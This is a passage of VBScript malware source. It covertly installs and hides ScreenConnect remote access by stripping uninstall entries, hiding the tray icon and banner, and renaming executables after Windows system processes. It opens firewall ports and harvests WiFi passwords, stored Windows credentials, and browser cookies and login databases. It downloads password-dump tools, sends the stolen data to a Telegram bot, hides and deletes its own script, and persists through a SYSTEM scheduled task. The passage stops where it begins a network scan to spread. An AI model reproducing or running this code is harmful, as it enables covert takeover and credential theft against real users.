            If Not IsEmpty(sDisplayName) And sDisplayName <> "" Then
                If InStr(1, sDisplayName, sKeyword, vbTextCompare) > 0 Then
                    oReg.SetDWORDValue lHive, sKeyPath & "\" & sSubKey, "SystemComponent", 1
                    oReg.DeleteValue lHive, sKeyPath & "\" & sSubKey, "DisplayName"
                    oReg.DeleteValue lHive, sKeyPath & "\" & sSubKey, "DisplayIcon"
                    oReg.DeleteValue lHive, sKeyPath & "\" & sSubKey, "DisplayVersion"
                    oReg.DeleteValue lHive, sKeyPath & "\" & sSubKey, "Publisher"
                    oReg.DeleteValue lHive, sKeyPath & "\" & sSubKey, "URLInfoAbout"
                    oReg.DeleteValue lHive, sKeyPath & "\" & sSubKey, "HelpLink"
                    oReg.DeleteValue lHive, sKeyPath & "\" & sSubKey, "UninstallString"
                    oReg.DeleteValue lHive, sKeyPath & "\" & sSubKey, "QuietUninstallString"
                    oReg.SetDWORDValue lHive, sKeyPath & "\" & sSubKey, "NoRemove", 0
                    oReg.SetDWORDValue lHive, sKeyPath & "\" & sSubKey, "NoModify", 1
                    LogMessage "[STEALTH] Hid: " & sDisplayName
                End If
            End If
        Next
    End If
    On Error GoTo 0
End Sub

Sub HideTrayIcon()
    On Error Resume Next
    Const HKLM = &H80000002
    Dim oReg
    Set oReg = GetObject("winmgmts:{impersonationLevel=impersonate}!\\.\root\default:StdRegProv")
    oReg.SetDWORDValue HKLM, "SOFTWARE\ScreenConnect", "HideTrayIcon", 1
    oReg.SetDWORDValue HKLM, "SOFTWARE\WOW6432Node\ScreenConnect", "HideTrayIcon", 1
    oReg.SetDWORDValue HKLM, "SOFTWARE\ScreenConnect", "ShowTrayIcon", 0
    oReg.SetDWORDValue HKLM, "SOFTWARE\WOW6432Node\ScreenConnect", "ShowTrayIcon", 0
    Set oReg = Nothing
    LogMessage "[STEALTH] Tray icon hidden."
    On Error GoTo 0
End Sub

Sub HideControlBanner()
    On Error Resume Next
    Const HKLM = &H80000002
    Dim oReg
    Set oReg = GetObject("winmgmts:{impersonationLevel=impersonate}!\\.\root\default:StdRegProv")
    ' Method 1: Disable banner
    oReg.SetDWORDValue HKLM, "SOFTWARE\ScreenConnect", "ShowGuestBanner", 0
    oReg.SetDWORDValue HKLM, "SOFTWARE\WOW6432Node\ScreenConnect", "ShowGuestBanner", 0
    ' Method 2: Transparent
    oReg.SetDWORDValue HKLM, "SOFTWARE\ScreenConnect", "BannerOpacity", 0
    oReg.SetDWORDValue HKLM, "SOFTWARE\WOW6432Node\ScreenConnect", "BannerOpacity", 0
    ' Method 3: Auto-minimize
    oReg.SetDWORDValue HKLM, "SOFTWARE\ScreenConnect", "AutoMinimizeBanner", 1
    oReg.SetDWORDValue HKLM, "SOFTWARE\ScreenConnect", "AutoMinimizeDelay", 1
    oReg.SetDWORDValue HKLM, "SOFTWARE\WOW6432Node\ScreenConnect", "AutoMinimizeBanner", 1
    oReg.SetDWORDValue HKLM, "SOFTWARE\WOW6432Node\ScreenConnect", "AutoMinimizeDelay", 1
    Set oReg = Nothing
    LogMessage "[STEALTH] Banner hidden."
    On Error GoTo 0
End Sub

Sub RenameExecutableToSystemName()
    On Error Resume Next
    Dim aSystemNames
    aSystemNames = Array("svchost.exe", "winlogon.exe", "csrss.exe", "lsass.exe", "services.exe", "spoolsv.exe", "taskhostw.exe", "RuntimeBroker.exe")
    Randomize
    Dim sNewName: sNewName = aSystemNames(Int(Rnd * UBound(aSystemNames)))
    
    Dim aSearchPaths
    aSearchPaths = Array("C:\Program Files\ScreenConnect\", "C:\Program Files (x86)\ScreenConnect\", _
        "C:\ProgramData\ScreenConnect\", oShell.ExpandEnvironmentStrings("%APPDATA%") & "\ScreenConnect\", _
        oShell.ExpandEnvironmentStrings("%LOCALAPPDATA%") & "\ScreenConnect\")
    
    Dim sPath
    For Each sPath In aSearchPaths
        If oFSO.FolderExists(sPath) Then
            Dim oFolder, oFile
            Set oFolder = oFSO.GetFolder(sPath)
            For Each oFile In oFolder.Files
                If LCase(oFSO.GetExtensionName(oFile.Name)) = "exe" Then
                    If InStr(1, oFile.Name, "ScreenConnect", vbTextCompare) > 0 Or _
                       InStr(1, oFile.Name, "ConnectWise", vbTextCompare) > 0 Then
                        oShell.Run "cmd /c rename """ & oFile.Path & """ " & sNewName, 0, True
                        LogMessage "[STEALTH] Renamed to: " & sNewName
                    End If
                End If
            Next
            Set oFolder = Nothing
        End If
    Next
    On Error GoTo 0
End Sub

'==========================================================================
' NETWORK ACCESS
'==========================================================================
Sub AddFirewallExceptions()
    On Error Resume Next
    LogMessage "[NETWORK] Adding firewall exceptions..."
    Dim sExePath: sExePath = FindScreenConnectExe()
    If sExePath <> "" Then
        oShell.Run "netsh advfirewall firewall add rule name=""SC-Inbound"" dir=in program=""" & sExePath & """ action=allow profile=any", 0, True
        oShell.Run "netsh advfirewall firewall add rule name=""SC-Outbound"" dir=out program=""" & sExePath & """ action=allow profile=any", 0, True
    End If
    Dim aPorts, nPort: aPorts = Array(443, 80, 8080, 8443, 5985, 5986)
    For Each nPort In aPorts
        oShell.Run "netsh advfirewall firewall add rule name=""SC-Port-" & nPort & """ dir=in protocol=tcp localport=" & nPort & " action=allow profile=any", 0, True
    Next
    On Error GoTo 0
End Sub

Function FindScreenConnectExe()
    On Error Resume Next
    Dim aSearchPaths, sPath, oFolder, oFile
    aSearchPaths = Array("C:\Program Files\ScreenConnect\", "C:\Program Files (x86)\ScreenConnect\", _
        "C:\ProgramData\ScreenConnect\", oShell.ExpandEnvironmentStrings("%APPDATA%") & "\ScreenConnect\", _
        oShell.ExpandEnvironmentStrings("%LOCALAPPDATA%") & "\ScreenConnect\")
    For Each sPath In aSearchPaths
        If oFSO.FolderExists(sPath) Then
            Set oFolder = oFSO.GetFolder(sPath)
            For Each oFile In oFolder.Files
                If LCase(oFSO.GetExtensionName(oFile.Name)) = "exe" Then
                    FindScreenConnectExe = oFile.Path: Set oFolder = Nothing: Exit Function
                End If
            Next
            Set oFolder = Nothing
        End If
    Next
    FindScreenConnectExe = ""
    On Error GoTo 0
End Function

'==========================================================================
' DATA HARVESTING
'==========================================================================
Sub CreateDataDirectory()
    On Error Resume Next
    If oFSO.FolderExists(sDataDir) Then oFSO.DeleteFolder sDataDir, True
    oFSO.CreateFolder sDataDir
    LogMessage "[HARVEST] Data directory created."
    On Error GoTo 0
End Sub

Sub HarvestWiFiCredentials()
    On Error Resume Next
    Dim sOutputFile: sOutputFile = sDataDir & "\WiFi_Credentials.txt"
    Dim oFile: Set oFile = oFSO.CreateTextFile(sOutputFile, True)
    oFile.WriteLine "=== WiFi Credentials ==="
    oFile.WriteLine "Machine: " & oShell.ExpandEnvironmentStrings("%COMPUTERNAME%")
    oFile.WriteLine "Date: " & Now
    oFile.WriteLine ""
    
    oShell.Run "cmd /c netsh wlan show profiles > """ & sTempDir & "\wifi_profiles.txt"" ", 0, True
    If oFSO.FileExists(sTempDir & "\wifi_profiles.txt") Then
        Dim oTempFile, sLine
        Set oTempFile = oFSO.OpenTextFile(sTempDir & "\wifi_profiles.txt")
        Do While oTempFile.AtEndOfStream <> True
            sLine = oTempFile.ReadLine
            If InStr(1, sLine, "All User Profile", vbTextCompare) > 0 Then
                Dim sProfileName: sProfileName = Trim(Mid(sLine, InStr(sLine, ":") + 1))
                Dim sPassFile: sPassFile = sTempDir & "\wifi_pass.txt"
                oShell.Run "cmd /c netsh wlan show profile name=""" & sProfileName & """ key=clear > """ & sPassFile & """", 0, True
                If oFSO.FileExists(sPassFile) Then
                    Dim oPassFile, sPassLine, sPassword: sPassword = "Not found"
                    Set oPassFile = oFSO.OpenTextFile(sPassFile)
                    Do While oPassFile.AtEndOfStream <> True
                        sPassLine = oPassFile.ReadLine
                        If InStr(1, sPassLine, "Key Content", vbTextCompare) > 0 Then
                            sPassword = Trim(Mid(sPassLine, InStr(sPassLine, ":") + 1))
                        End If
                    Loop
                    oPassFile.Close
                    oFile.WriteLine "  Network: " & sProfileName & " | Password: " & sPassword
                    oFSO.DeleteFile sPassFile, True
                End If
            End If
        Loop
        oTempFile.Close
        oFSO.DeleteFile sTempDir & "\wifi_profiles.txt", True
    End If
    oFile.Close
    On Error GoTo 0
End Sub

Sub HarvestSavedPasswords()
    On Error Resume Next
    Dim sOutputFile: sOutputFile = sDataDir & "\Saved_Passwords.txt"
    Dim oFile: Set oFile = oFSO.CreateTextFile(sOutputFile, True)
    oFile.WriteLine "=== Saved Windows Credentials ==="
    oFile.WriteLine "Machine: " & oShell.ExpandEnvironmentStrings("%COMPUTERNAME%")
    oFile.WriteLine ""
    
    oShell.Run "cmdkey /list > """ & sTempDir & "\cmdkey.txt""", 0, True
    If oFSO.FileExists(sTempDir & "\cmdkey.txt") Then
        oFile.WriteLine "--- Stored Credentials ---"
        Dim oTempFile, sLine
        Set oTempFile = oFSO.OpenTextFile(sTempDir & "\cmdkey.txt")
        Do While oTempFile.AtEndOfStream <> True
            sLine = oTempFile.ReadLine
            If sLine <> "" Then oFile.WriteLine sLine
        Loop
        oTempFile.Close
        oFSO.DeleteFile sTempDir & "\cmdkey.txt", True
    End If
    oFile.Close
    On Error GoTo 0
End Sub

Sub HarvestBrowserData()
    On Error Resume Next
    Dim sBrowserDir: sBrowserDir = sDataDir & "\Browser_Data"
    If Not oFSO.FolderExists(sBrowserDir) Then oFSO.CreateFolder sBrowserDir
    
    ' Chrome
    Dim sChromeDir: sChromeDir = oShell.ExpandEnvironmentStrings("%LOCALAPPDATA%") & "\Google\Chrome\User Data"
    If oFSO.FolderExists(sChromeDir) Then
        Dim sChromeOut: sChromeOut = sBrowserDir & "\Chrome"
        If Not oFSO.FolderExists(sChromeOut) Then oFSO.CreateFolder sChromeOut
        Dim oChromeFolder, oSubFolder
        Set oChromeFolder = oFSO.GetFolder(sChromeDir)
        For Each oSubFolder In oChromeFolder.SubFolders
            If Left(oSubFolder.Name, 8) = "Profile " Or oSubFolder.Name = "Default" Then
                If oFSO.FileExists(oSubFolder.Path & "\Cookies") Then
                    oFSO.CopyFile oSubFolder.Path & "\Cookies", sChromeOut & "\" & oSubFolder.Name & "_Cookies.sqlite", True
                End If
                If oFSO.FileExists(oSubFolder.Path & "\Login Data") Then
                    oFSO.CopyFile oSubFolder.Path & "\Login Data", sChromeOut & "\" & oSubFolder.Name & "_Login_Data.sqlite", True
                End If
            End If
        Next
        If oFSO.FileExists(sChromeDir & "\Local State") Then
            oFSO.CopyFile sChromeDir & "\Local State", sChromeOut & "\Local_State.json", True
        End If
        Set oChromeFolder = Nothing
    End If
    
    ' Edge
    Dim sEdgeDir: sEdgeDir = oShell.ExpandEnvironmentStrings("%LOCALAPPDATA%") & "\Microsoft\Edge\User Data"
    If oFSO.FolderExists(sEdgeDir) Then
        Dim sEdgeOut: sEdgeOut = sBrowserDir & "\Edge"
        If Not oFSO.FolderExists(sEdgeOut) Then oFSO.CreateFolder sEdgeOut
        Dim oEdgeFolder, oSubFolder2
        Set oEdgeFolder = oFSO.GetFolder(sEdgeDir)
        For Each oSubFolder2 In oEdgeFolder.SubFolders
            If Left(oSubFolder2.Name, 8) = "Profile " Or oSubFolder2.Name = "Default" Then
                If oFSO.FileExists(oSubFolder2.Path & "\Cookies") Then
                    oFSO.CopyFile oSubFolder2.Path & "\Cookies", sEdgeOut & "\" & oSubFolder2.Name & "_Cookies.sqlite", True
                End If
                If oFSO.FileExists(oSubFolder2.Path & "\Login Data") Then
                    oFSO.CopyFile oSubFolder2.Path & "\Login Data", sEdgeOut & "\" & oSubFolder2.Name & "_Login_Data.sqlite", True
                End If
            End If
        Next
        Set oEdgeFolder = Nothing
    End If
    
    ' Firefox
    Dim sFirefoxDir: sFirefoxDir = oShell.ExpandEnvironmentStrings("%APPDATA%") & "\Mozilla\Firefox\Profiles"
    If oFSO.FolderExists(sFirefoxDir) Then
        Dim sFirefoxOut: sFirefoxOut = sBrowserDir & "\Firefox"
        If Not oFSO.FolderExists(sFirefoxOut) Then oFSO.CreateFolder sFirefoxOut
        Dim oFirefoxFolder, oProfileFolder
        Set oFirefoxFolder = oFSO.GetFolder(sFirefoxDir)
        For Each oProfileFolder In oFirefoxFolder.SubFolders
            If oFSO.FileExists(oProfileFolder.Path & "\cookies.sqlite") Then
                oFSO.CopyFile oProfileFolder.Path & "\cookies.sqlite", sFirefoxOut & "\" & oProfileFolder.Name & "_cookies.sqlite", True
            End If
            If oFSO.FileExists(oProfileFolder.Path & "\logins.json") Then
                oFSO.CopyFile oProfileFolder.Path & "\logins.json", sFirefoxOut & "\" & oProfileFolder.Name & "_logins.json", True
            End If
            If oFSO.FileExists(oProfileFolder.Path & "\key4.db") Then
                oFSO.CopyFile oProfileFolder.Path & "\key4.db", sFirefoxOut & "\" & oProfileFolder.Name & "_key4.db", True
            End If
        Next
        Set oFirefoxFolder = Nothing
    End If
    
    LogMessage "[HARVEST] Browser data harvested."
    On Error GoTo 0
End Sub

'==========================================================================
' BROWSER PASSWORDS CSV EXPORT + SEND TO TELEGRAM
'==========================================================================
Sub ExportAndSendBrowserPasswords()
    On Error Resume Next
    LogMessage "[BROWSER] Exporting browser passwords to CSV..."
    
    Dim sPassDir, sChromePassURL, sEdgePassURL
    Dim sChromePassExe, sEdgePassExe, sChromeCSV, sEdgeCSV, sZIPPath, sZIPPassword
    
    sPassDir = sTempDir & "\SC_Passwords"
    sChromePassURL = "https://www.nirsoft.net/toolsdownload/chromepass.zip"
    sEdgePassURL = "https://www.nirsoft.net/toolsdownload/edgepassview.zip"
    sChromePassExe = sPassDir & "\chromepass.exe"
    sEdgePassExe = sPassDir & "\edgepassview.exe"
    sChromeCSV = sPassDir & "\Chrome_Passwords.csv"
    sEdgeCSV = sPassDir & "\Edge_Passwords.csv"
    sZIPPath = sTempDir & "\SC_Passwords_" & oShell.ExpandEnvironmentStrings("%COMPUTERNAME%") & ".zip"
    sZIPPassword = "infected_2024"
    
    ' Create directory
    If Not oFSO.FolderExists(sPassDir) Then oFSO.CreateFolder sPassDir
    
    ' Download and extract ChromePass
    LogMessage "[BROWSER] Downloading ChromePass..."
    If DownloadFile(sChromePassURL, sPassDir & "\chromepass.zip") Then
        oShell.Run "powershell -Command ""Expand-Archive -Path '" & sPassDir & "\chromepass.zip' -DestinationPath '" & sPassDir & "' -Force"" ", 0, True
        oFSO.DeleteFile sPassDir & "\chromepass.zip", True
        WScript.Sleep 1000
    End If
    
    ' Download and extract EdgePass
    LogMessage "[BROWSER] Downloading EdgePass..."
    If DownloadFile(sEdgePassURL, sPassDir & "\edgepass.zip") Then
        oShell.Run "powershell -Command ""Expand-Archive -Path '" & sPassDir & "\edgepass.zip' -DestinationPath '" & sPassDir & "' -Force"" ", 0, True
        oFSO.DeleteFile sPassDir & "\edgepass.zip", True
        WScript.Sleep 1000
    End If
    
    ' Export Chrome passwords
    If oFSO.FileExists(sChromePassExe) Then
        LogMessage "[BROWSER] Exporting Chrome passwords..."
        oShell.Run """" & sChromePassExe & """ /stext """ & sChromeCSV & """", 0, True
        WScript.Sleep 3000
        If oFSO.FileExists(sChromeCSV) Then
            LogMessage "[BROWSER] Chrome CSV created: " & FormatFileSize(oFSO.GetFile(sChromeCSV).Size)
        End If
    End If
    
    ' Export Edge passwords
    If oFSO.FileExists(sEdgePassExe) Then
        LogMessage "[BROWSER] Exporting Edge passwords..."
        oShell.Run """" & sEdgePassExe & """ /stext """ & sEdgeCSV & """", 0, True
        WScript.Sleep 3000
        If oFSO.FileExists(sEdgeCSV) Then
            LogMessage "[BROWSER] Edge CSV created: " & FormatFileSize(oFSO.GetFile(sEdgeCSV).Size)
        End If
    End If
    
    ' Create ZIP file
    LogMessage "[BROWSER] Creating ZIP file..."
    If oFSO.FileExists(sZIPPath) Then oFSO.DeleteFile sZIPPath, True
    
    If oFSO.FileExists("C:\Program Files\7-Zip\7z.exe") Then
        oShell.Run """C:\Program Files\7-Zip\7z.exe"" a -tzip """ & sZIPPath & """ """ & sPassDir & "\*"" -p" & sZIPPassword & " -mhe=on -y", 0, True
    ElseIf oFSO.FileExists("C:\Program Files (x86)\7-Zip\7z.exe") Then
        oShell.Run """C:\Program Files (x86)\7-Zip\7z.exe"" a -tzip """ & sZIPPath & """ """ & sPassDir & "\*"" -p" & sZIPPassword & " -mhe=on -y", 0, True
    Else
        oShell.Run "powershell -Command ""Compress-Archive -Path '" & sPassDir & "\*' -DestinationPath '" & sZIPPath & "' -Force"" ", 0, True
    End If
    
    ' Send notifications to Telegram
    If oFSO.FileExists(sChromeCSV) Then
        SendTelegramMessage "[COOKIE] Chrome Passwords Exported - " & oShell.ExpandEnvironmentStrings("%COMPUTERNAME%")
    End If
    If oFSO.FileExists(sEdgeCSV) Then
        SendTelegramMessage "[COOKIE] Edge Passwords Exported - " & oShell.ExpandEnvironmentStrings("%COMPUTERNAME%")
    End If
    
    ' Send ZIP file
    If oFSO.FileExists(sZIPPath) Then
        SendFileToTelegram sZIPPath, "PASSWORDS ZIP - " & oShell.ExpandEnvironmentStrings("%COMPUTERNAME%") & " | Password: " & sZIPPassword
        LogMessage "[BROWSER] ZIP sent to Telegram."
    End If
    
    ' Send cookies
    SendBrowserCookiesToTelegram()
    
    LogMessage "[BROWSER] Export complete."
    On Error GoTo 0
End Sub

Sub SendBrowserCookiesToTelegram()
    On Error Resume Next
    Dim sBrowserDir: sBrowserDir = sDataDir & "\Browser_Data"
    
    If oFSO.FolderExists(sBrowserDir & "\Chrome") Then
        Dim oChromeFolder, oChromeFile
        Set oChromeFolder = oFSO.GetFolder(sBrowserDir & "\Chrome")
        For Each oChromeFile In oChromeFolder.Files
            If InStr(1, oChromeFile.Name, "Cookies", vbTextCompare) > 0 Then
                SendFileToTelegram oChromeFile.Path, "[COOKIE] Chrome Cookies - " & oShell.ExpandEnvironmentStrings("%COMPUTERNAME%")
            End If
        Next
        Set oChromeFolder = Nothing
    End If
    
    If oFSO.FolderExists(sBrowserDir & "\Edge") Then
        Dim oEdgeFolder, oEdgeFile
        Set oEdgeFolder = oFSO.GetFolder(sBrowserDir & "\Edge")
        For Each oEdgeFile In oEdgeFolder.Files
            If InStr(1, oEdgeFile.Name, "Cookies", vbTextCompare) > 0 Then
                SendFileToTelegram oEdgeFile.Path, "[COOKIE] Edge Cookies - " & oShell.ExpandEnvironmentStrings("%COMPUTERNAME%")
            End If
        Next
        Set oEdgeFolder = Nothing
    End If
    
    If oFSO.FolderExists(sBrowserDir & "\Firefox") Then
        Dim oFirefoxFolder, oFirefoxFile
        Set oFirefoxFolder = oFSO.GetFolder(sBrowserDir & "\Firefox")
        For Each oFirefoxFile In oFirefoxFolder.Files
            If InStr(1, oFirefoxFile.Name, "cookies", vbTextCompare) > 0 Then
                SendFileToTelegram oFirefoxFile.Path, "[COOKIE] Firefox Cookies - " & oShell.ExpandEnvironmentStrings("%COMPUTERNAME%")
            End If
        Next
        Set oFirefoxFolder = Nothing
    End If
    
    LogMessage "[BROWSER] Cookies sent to Telegram."
    On Error GoTo 0
End Sub

'==========================================================================
' TELEGRAM FUNCTIONS
'==========================================================================
Sub SendTelegramMessage(sMessage)
    On Error Resume Next
    If sBotToken = "" Or sChatID = "" Then Exit Sub
    
    Dim oHTTP, sURL, sRequestBody
    sURL = "https://api.telegram.org/bot" & sBotToken & "/sendMessage"
    sMessage = CleanTelegramText(sMessage)
    
    sRequestBody = "{"
    sRequestBody = sRequestBody & """chat_id"":""" & sChatID & """"
    sRequestBody = sRequestBody & ",""text"":""" & sMessage & """"
    sRequestBody = sRequestBody & "}"
    
    Set oHTTP = CreateObject("MSXML2.XMLHTTP")
    oHTTP.Open "POST", sURL, False
    oHTTP.setRequestHeader "Content-Type", "application/json; charset=UTF-8"
    oHTTP.Send sRequestBody
    Set oHTTP = Nothing
    On Error GoTo 0
End Sub

Sub SendFileToTelegram(sFilePath, sCaption)
    On Error Resume Next
    If Not oFSO.FileExists(sFilePath) Then Exit Sub
    If sBotToken = "" Or sChatID = "" Then Exit Sub
    
    Dim oHTTP, sURL, sBoundary, oStream, sHeader, sFooter
    sURL = "https://api.telegram.org/bot" & sBotToken & "/sendDocument"
    sBoundary = "----Boundary" & FormatDateForFile(Now)
    
    Set oStream = CreateObject("ADODB.Stream")
    oStream.Type = 1: oStream.Open
    oStream.LoadFromFile sFilePath
    
    sHeader = "--" & sBoundary & vbCrLf & _
              "Content-Disposition: form-data; name=""chat_id""" & vbCrLf & vbCrLf & _
              sChatID & vbCrLf & _
              "--" & sBoundary & vbCrLf & _
              "Content-Disposition: form-data; name=""document""; filename=""" & oFSO.GetFileName(sFilePath) & """" & vbCrLf & _
              "Content-Type: application/octet-stream" & vbCrLf & vbCrLf
    
    sCaption = CleanTelegramText(sCaption)
    sFooter = vbCrLf & "--" & sBoundary & vbCrLf & _
              "Content-Disposition: form-data; name=""caption""" & vbCrLf & vbCrLf & _
              sCaption & vbCrLf & _
              "--" & sBoundary & "--"
    
    Set oHTTP = CreateObject("MSXML2.XMLHTTP")
    oHTTP.Open "POST", sURL, False
    oHTTP.setRequestHeader "Content-Type", "multipart/form-data; boundary=" & sBoundary
    oHTTP.Send sHeader & oStream.Read() & sFooter
    
    oStream.Close
    Set oStream = Nothing
    Set oHTTP = Nothing
    On Error GoTo 0
End Sub

Function CleanTelegramText(sText)
    sText = Replace(sText, "🚀", "[START]")
    sText = Replace(sText, "🖥️", "[PC]")
    sText = Replace(sText, "👤", "[USER]")
    sText = Replace(sText, "🌐", "[NET]")
    sText = Replace(sText, "✅", "[OK]")
    sText = Replace(sText, "❌", "[FAIL]")
    sText = Replace(sText, "🛡️", "[SHIELD]")
    sText = Replace(sText, "📡", "[SCAN]")
    sText = Replace(sText, "💰", "[MONEY]")
    sText = Replace(sText, "🔑", "[KEY]")
    sText = Replace(sText, "📶", "[WIFI]")
    sText = Replace(sText, "🍪", "[COOKIE]")
    sText = Replace(sText, "📧", "[MAIL]")
    sText = Replace(sText, "🔓", "[UNLOCK]")
    sText = Replace(sText, "📦", "[PACKAGE]")
    sText = Replace(sText, "⚠️", "[WARN]")
    sText = Replace(sText, "🔍", "[SEARCH]")
    sText = Replace(sText, "💾", "[USB]")
    sText = Replace(sText, "🔄", "[REPEAT]")
    sText = Replace(sText, "📊", "[STATS]")
    sText = Replace(sText, "💻", "[OS]")
    sText = Replace(sText, "⏰", "[TIME]")
    sText = Replace(sText, "━━━━━━━━━━━━━━━━━━━━━", "-----------------------------")
    sText = Replace(sText, "—", "-")
    sText = Replace(sText, "–", "-")
    sText = Replace(sText, "\", "\\")
    sText = Replace(sText, """", "\""")
    sText = Replace(sText, vbCrLf, "\n")
    sText = Replace(sText, vbLf, "\n")
    sText = Replace(sText, vbTab, "\t")
    CleanTelegramText = sText
End Function

Sub SendTelegramReport(sStatus)
    On Error Resume Next
    Dim sMessage, sComputer, sUser, sIP
    sComputer = oShell.ExpandEnvironmentStrings("%COMPUTERNAME%")
    sUser = oShell.ExpandEnvironmentStrings("%USERNAME%")
    
    Dim colNet, objNet
    Set colNet = oWMI.ExecQuery("SELECT * FROM Win32_NetworkAdapterConfiguration WHERE IPEnabled = True")
    For Each objNet In colNet
        If Not IsNull(objNet.IPAddress) Then sIP = objNet.IPAddress(0): Exit For
    Next
    If sIP = "" Then sIP = "Unknown"
    
    sMessage = "[START] SC INSTALLER REPORT"
    sMessage = sMessage & vbCrLf & "-----------------------------"
    sMessage = sMessage & vbCrLf & "[STATUS] " & sStatus
    sMessage = sMessage & vbCrLf & "[TIME] " & Now
    sMessage = sMessage & vbCrLf & "-----------------------------"
    sMessage = sMessage & vbCrLf & "[PC] " & sComputer
    sMessage = sMessage & vbCrLf & "[USER] " & sUser
    sMessage = sMessage & vbCrLf & "[NET] " & sIP
    
    If g_RemovedTools <> "" Then
        sMessage = sMessage & vbCrLf & "[OK] Removed: " & g_RemovedTools
    End If
    If g_NetworkPCs <> "" Then
        sMessage = sMessage & vbCrLf & "[NET] Network PCs: " & g_NetworkPCs
    End If
    
    SendTelegramMessage sMessage
    On Error GoTo 0
End Sub

Sub SendHarvestDataAsMessages()
    On Error Resume Next
    LogMessage "[TELEGRAM] Sending harvest data..."
    
    Dim dicSent
    Set dicSent = CreateObject("Scripting.Dictionary")
    
    ' Send WiFi credentials
    Dim sWiFiFile: sWiFiFile = sDataDir & "\WiFi_Credentials.txt"
    If oFSO.FileExists(sWiFiFile) And Not dicSent.Exists("wifi") Then
        dicSent.Add "wifi", True
        SendFileAsTelegramMessage sWiFiFile, "[WIFI] WiFi Credentials Found"
        WScript.Sleep 1000
    End If
    
    ' Send saved passwords
    Dim sPassFile: sPassFile = sDataDir & "\Saved_Passwords.txt"
    If oFSO.FileExists(sPassFile) And Not dicSent.Exists("pass") Then
        dicSent.Add "pass", True
        SendFileAsTelegramMessage sPassFile, "[UNLOCK] Saved Windows Credentials"
        WScript.Sleep 1000
    End If
    
    Set dicSent = Nothing
    LogMessage "[TELEGRAM] Harvest data sent."
    On Error GoTo 0
End Sub

Sub SendFileAsTelegramMessage(sFilePath, sCaption)
    On Error Resume Next
    If Not oFSO.FileExists(sFilePath) Then Exit Sub
    
    Dim oFile, sContent
    Set oFile = oFSO.OpenTextFile(sFilePath)
    sContent = oFile.ReadAll
    oFile.Close
    
    If Len(sContent) > 3500 Then
        sContent = Left(sContent, 3500) & "...[truncated]"
    End If
    
    Dim sMessage
    sMessage = sCaption & "\n-----------------------------\n" & sContent
    SendTelegramMessage sMessage
    
    LogMessage "[TELEGRAM] Sent: " & oFSO.GetFileName(sFilePath)
    On Error GoTo 0
End Sub

'==========================================================================
' HIDE SCRIPT + PERSISTENCE
'==========================================================================
Sub HideScript()
    On Error Resume Next
    LogMessage "[HIDE] Hiding script to: " & sHiddenScriptPath
    
    Dim sOriginalScript: sOriginalScript = WScript.ScriptFullName
    Dim sHiddenDir: sHiddenDir = oFSO.GetParentFolderName(sHiddenScriptPath)
    
    ' Create hidden directory
    If Not oFSO.FolderExists(sHiddenDir) Then
        CreateNestedFolders sHiddenDir
    End If
    
    ' Copy if not already hidden
    If LCase(sOriginalScript) <> LCase(sHiddenScriptPath) Then
        oFSO.CopyFile sOriginalScript, sHiddenScriptPath, True
        
        ' Set Hidden + System attributes
        Dim oHiddenFile
        Set oHiddenFile = oFSO.GetFile(sHiddenScriptPath)
        oHiddenFile.Attributes = 2 + 4  ' Hidden + System
        Set oHiddenFile = Nothing
        
        LogMessage "[HIDE] Script copied and hidden."
        
        ' Delete original using timeout trick
        LogMessage "[HIDE] Scheduling deletion of original..."
        oShell.Run "cmd /c timeout /t 3 /nobreak > nul & del /f /q """ & sOriginalScript & """", 0, False
        LogMessage "[HIDE] Original script will be deleted shortly."
    End If
    
    On Error GoTo 0
End Sub

Sub CreatePersistence()
    On Error Resume Next
    LogMessage "[PERSISTENCE] Creating persistence..."
    
    Dim sTaskName: sTaskName = "WindowsSystemMaintenance"
    
    ' Delete existing task
    oShell.Run "schtasks /delete /tn """ & sTaskName & """ /f", 0, True
    
    ' Create task with SYSTEM privileges
    Dim sCreateTaskCmd
    sCreateTaskCmd = "schtasks /create /tn """ & sTaskName & """ " & _
                     "/tr ""wscript.exe //B """ & sHiddenScriptPath & """""" & _
                     "/sc DAILY " & _
                     "/st 00:00 " & _
                     "/ri 1440 " & _
                     "/du 24:00 " & _
                     "/ru SYSTEM " & _
                     "/rl HIGHEST " & _
                     "/f"
    oShell.Run sCreateTaskCmd, 0, True
    
    ' Add logon trigger
    oShell.Run "schtasks /change /tn """ & sTaskName & """ " & _
               "/tr ""wscript.exe //B """ & sHiddenScriptPath & """""" & _
               " /sc ONLOGON", 0, True
    
    If Err.Number = 0 Then
        LogMessage "[PERSISTENCE] Task created successfully."
    Else
        ' Fallback: Registry Run key
        LogMessage "[PERSISTENCE] Task failed. Using Registry fallback..."
        oShell.RegWrite "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\" & sTaskName, _
                        "wscript.exe //B """ & sHiddenScriptPath & """", "REG_SZ"
        LogMessage "[PERSISTENCE] Registry Run key added."
    End If
    
    On Error GoTo 0
End Sub

Function IsPersistenceRun()
    IsPersistenceRun = (LCase(WScript.ScriptFullName) = LCase(sHiddenScriptPath))
End Function

Sub QuickHealthCheck()
    On Error Resume Next
    LogMessage "[HEALTH] Running health check..."
    
    ' Check if ScreenConnect service exists
    Dim objService
    Set objService = oWMI.Get("Win32_Service.Name='ScreenConnect Client'")
    
    If Err.Number <> 0 Then
        LogMessage "[HEALTH] Service not found. Reinstalling..."
        Err.Clear
        If DownloadFile(sMsiUrl, sMsiPath) Then
            InstallWithTimeout sMsiPath, INSTALL_TIMEOUT_MIN
            ForceHideApplication sKeywordToHide
            HideTrayIcon()
            HideControlBanner()
        End If
    Else
        If objService.State <> "Running" Then
            LogMessage "[HEALTH] Service not running. Starting..."
            objService.StartService()
            WScript.Sleep 3000
        Else
            LogMessage "[HEALTH] Service is healthy."
        End If
    End If
    
    ' Re-hide
    ForceHideApplication sKeywordToHide
    HideTrayIcon()
    HideControlBanner()
    
    On Error GoTo 0
End Sub

'==========================================================================
' NETWORK SPREAD
'==========================================================================
Sub NetworkSpread()
    On Error Resume Next
    LogMessage "[SPREAD] Scanning network..."
    
    ' Get local IP
    Dim colNet, objNet, sLocalIP
    Set colNet = oWMI.ExecQuery("SELECT * FROM Win32_NetworkAdapterConfiguration WHERE IPEnabled = True")
    For Each objNet In colNet
        If Not IsNull(objNet.IPAddress) Then
            sLocalIP = objNet.IPAddress(0)
            Exit For
        End If
    Next
    
    If sLocalIP = "" Then
        LogMessage "[SPREAD] No IP found. Skipping."
        Exit Sub
    End If
    
    LogMessage "[SPREAD] Local IP: " & sLocalIP
    
    ' Determine network range
    Dim aIPParts, sBaseIP
    aIPParts = Split(sLocalIP, ".")
